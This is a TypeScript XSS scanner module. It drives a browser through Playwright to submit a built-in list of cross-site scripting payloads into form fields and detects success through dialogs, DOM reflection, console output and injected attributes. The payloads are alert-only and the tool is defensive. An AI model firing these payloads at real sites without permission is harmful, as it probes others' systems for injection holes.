/**
 * XSS Detector
 * Detects XSS vulnerabilities through multiple methods:
 * - Dialog detection (alert, confirm, prompt)
 * - DOM reflection
 * - Console output monitoring
 * - Attribute injection
 */

import type { Page } from 'playwright';
import type { XSSDetectionMethod, XSSPayload, XSSVulnerability } from './types.js';

/**
 * Default XSS payloads for testing
 */
export const DEFAULT_XSS_PAYLOADS: XSSPayload[] = [
  // Script-based payloads
  {
    payload: '<script>alert("XSS")</script>',
    type: 'script',
    context: 'html',
  },
  {
    payload: '"><script>alert("XSS")</script>',
    type: 'script',
    context: 'attribute',
  },
  {
    payload: "'-alert('XSS')-'",
    type: 'script',
    context: 'javascript',
  },
  {
    payload: '</script><script>alert("XSS")</script>',
    type: 'script',
    context: 'html',
  },

  // Event handler payloads
  {
    payload: '<img src=x onerror=alert("XSS")>',
    type: 'img',
    context: 'html',
  },
  {
    payload: '" onmouseover="alert(\'XSS\')"',
    type: 'event',
    context: 'attribute',
  },
  {
    payload: "' onfocus='alert(1)' autofocus='",
    type: 'event',
    context: 'attribute',
  },

  // SVG payloads
  {
    payload: '<svg onload=alert("XSS")>',
    type: 'svg',
    context: 'html',
  },
  {
    payload: '<svg><script>alert("XSS")</script></svg>',
    type: 'svg',
    context: 'html',
  },

  // JavaScript URI payloads
  {
    payload: 'javascript:alert("XSS")',
    type: 'javascript_uri',
    context: 'url',
  },
  {
    payload: 'javascript:alert(document.domain)',
    type: 'javascript_uri',
    context: 'url',
  },

  // Additional bypass payloads
  {
    payload: '<body onload=alert("XSS")>',
    type: 'event',
    context: 'html',
  },
  {
    payload: '<iframe src="javascript:alert(\'XSS\')">',
    type: 'javascript_uri',
    context: 'html',
  },
  {
    payload: '<details open ontoggle=alert("XSS")>',
    type: 'event',
    context: 'html',
  },
];

/**
 * Generate a unique marker for XSS detection
 */
export function generateXSSMarker(): string {
  const random = Math.random().toString(36).substring(2, 10);
  return `XSS_MARKER_${random}_${Date.now()}`;
}

/**
 * Create payloads with a specific marker for detection
 */
export function createMarkedPayloads(marker: string): string[] {
  return [
    `<script>alert("${marker}")</script>`,
    `<img src=x onerror=alert("${marker}")>`,
    `<svg onload=alert("${marker}")>`,
    `"><script>alert("${marker}")</script>`,
    `'-alert('${marker}')-'`,
    `<body onload=alert("${marker}")>`,
    `<details open ontoggle=alert("${marker}")>`,
  ];
}

/**
 * XSS Detector class for testing forms and inputs
 */
export class XSSDetector {
  private dialogDetected: boolean = false;
  private dialogContent: string | null = null;
  private consoleMessages: string[] = [];
  private marker: string;
  private detectedVulnerabilities: XSSVulnerability[] = [];

  constructor(marker?: string) {
    this.marker = marker || generateXSSMarker();
  }

  /**
   * Set up detection listeners on a page
   */
  async setupListeners(page: Page): Promise<void> {
    // Dialog detection (alert, confirm, prompt)
    page.on('dialog', async dialog => {
      this.dialogDetected = true;
      this.dialogContent = dialog.message();
      await dialog.dismiss();
    });

    // Console message detection
    page.on('console', msg => {
      this.consoleMessages.push(msg.text());
    });
  }

  /**
   * Check for DOM reflection of payload
   */
  async checkDOMReflection(page: Page, payload: string): Promise<boolean> {
    try {
      const reflected = await page.evaluate((p: string) => {
        return document.body.innerHTML.includes(p);
      }, payload);
      return reflected;
    } catch {
      return false;
    }
  }

  /**
   * Check for reflection in specific elements
   */
  async checkElementReflection(
    page: Page,
    payload: string,
    selector?: string
  ): Promise<{ reflected: boolean; location?: string }> {
    try {
      const result = await page.evaluate(
        ({ p, sel }: { p: string; sel?: string }) => {
          const elements = sel
            ? Array.from(document.querySelectorAll(sel))
            : [document.body];

          for (const el of elements) {
            if (el.innerHTML.includes(p)) {
              return {
                reflected: true,
                location: el.tagName.toLowerCase() + (el.id ? `#${el.id}` : ''),
              };
            }
          }
          return { reflected: false };
        },
        { p: payload, sel: selector }
      );
      return result;
    } catch {
      return { reflected: false };
    }
  }

  /**
   * Check for attribute injection
   */
  async checkAttributeInjection(page: Page, marker: string): Promise<boolean> {
    try {
      const found = await page.evaluate((m: string) => {
        // Check all elements for injected event handlers
        const allElements = document.querySelectorAll('*');
        for (const el of allElements) {
          for (const attr of el.attributes) {
            if (attr.name.startsWith('on') && attr.value.includes(m)) {
              return true;
            }
          }
        }
        return false;
      }, marker);
      return found;
    } catch {
      return false;
    }
  }

  /**
   * Test a single payload
   */
  async testPayload(
    page: Page,
    fieldSelector: string,
    payload: string,
    submitSelector?: string
  ): Promise<XSSVulnerability | null> {
    // Reset detection state
    this.dialogDetected = false;
    this.dialogContent = null;

    try {
      // Fill the field with payload
      await page.fill(fieldSelector, payload);

      // Submit if selector provided
      if (submitSelector) {
        await page.click(submitSelector);
        // Wait for navigation or network idle
        await page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => {});
      }

      // Wait briefly for any scripts to execute
      await page.waitForTimeout(500);

      // Check detection methods
      let detectionMethod: XSSDetectionMethod | null = null;
      let reflectedIn: string | undefined;

      // Method 1: Dialog detection
      if (this.dialogDetected) {
        detectionMethod = 'dialog';
      }

      // Method 2: DOM reflection
      if (!detectionMethod) {
        const domResult = await this.checkElementReflection(page, this.marker);
        if (domResult.reflected) {
          detectionMethod = 'dom_reflection';
          reflectedIn = domResult.location;
        }
      }

      // Method 3: Console detection
      if (!detectionMethod) {
        const consoleXSS = this.consoleMessages.some(msg => msg.includes(this.marker));
        if (consoleXSS) {
          detectionMethod = 'console';
        }
      }

      // Method 4: Attribute injection
      if (!detectionMethod) {
        const attrInjection = await this.checkAttributeInjection(page, this.marker);
        if (attrInjection) {
          detectionMethod = 'attribute';
        }
      }

      if (detectionMethod) {
        return {
          field_name: fieldSelector,
          payload,
          detection_method: detectionMethod,
          reflected_in: reflectedIn,
        };
      }

      return null;
    } catch (error) {
      // Log but don't fail - some payloads may cause errors
      console.error(`[xss-detector] Error testing payload: ${error}`);
      return null;
    }
  }

  /**
   * Test multiple payloads on a field
   */
  async testField(
    page: Page,
    fieldName: string,
    fieldSelector: string,
    payloads: string[],
    submitSelector?: string
  ): Promise<XSSVulnerability[]> {
    const vulnerabilities: XSSVulnerability[] = [];

    for (const payload of payloads) {
      // Create marked version of payload
      const markedPayload = payload.replace(/XSS/g, this.marker).replace(/1/g, `"${this.marker}"`);

      const vuln = await this.testPayload(page, fieldSelector, markedPayload, submitSelector);
      if (vuln) {
        vuln.field_name = fieldName;
        vulnerabilities.push(vuln);
        // Found a vulnerability, no need to test more payloads for this field
        break;
      }

      // Navigate back if form was submitted
      if (submitSelector) {
        await page.goBack().catch(() => {});
        await page.waitForLoadState('domcontentloaded').catch(() => {});
      }
    }

    return vulnerabilities;
  }

  /**
   * Get the current marker
   */
  getMarker(): string {
    return this.marker;
  }

  /**
   * Get default payloads as strings
   */
  static getDefaultPayloadStrings(): string[] {
    return DEFAULT_XSS_PAYLOADS.map(p => p.payload);
  }

  /**
   * Reset detection state
   */
  reset(): void {
    this.dialogDetected = false;
    this.dialogContent = null;
    this.consoleMessages = [];
    this.detectedVulnerabilities = [];
    this.marker = generateXSSMarker();
  }

  /**
   * Check if dialog was detected
   */
  wasDialogDetected(): boolean {
    return this.dialogDetected;
  }

  /**
   * Get dialog content if detected
   */
  getDialogContent(): string | null {
    return this.dialogContent;
  }

  /**
   * Get console messages captured
   */
  getConsoleMessages(): string[] {
    return [...this.consoleMessages];
  }
}
